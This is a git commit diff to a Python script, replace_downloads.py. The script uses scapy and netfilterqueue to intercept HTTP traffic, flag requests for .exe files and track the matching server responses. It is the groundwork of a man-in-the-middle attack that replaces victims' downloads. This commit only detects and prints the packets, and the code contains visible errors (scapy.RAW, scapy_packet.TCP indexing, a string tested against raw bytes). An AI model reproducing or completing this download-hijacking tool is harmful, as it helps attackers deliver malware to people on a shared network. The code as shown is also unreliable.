fa11138de28122e832f94719fbb266fa5bd7b11c
Michael Zick <1907006+michaelzick@users.noreply.github.com>
2022-08-22 20:05:51 +0000

    Added more if/elif

--- replace_downloads.py
+++ replace_downloads.py
@@ -3,11 +3,22 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list = []
+
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.RAW):
-        print(scapy_packet.show())
+        if scapy_packet[scapy.TCP].dport == 80:
+            if '.exe' in scapy_packet[scapy.RAW].load:
+                print('[+] .exe request')
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                print(scapy_packet.show())
+        elif scapy_packet[scapy_packet.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print('[+] replacing file')
+                print(scapy_packet.show())
 
     packet.accept()
 
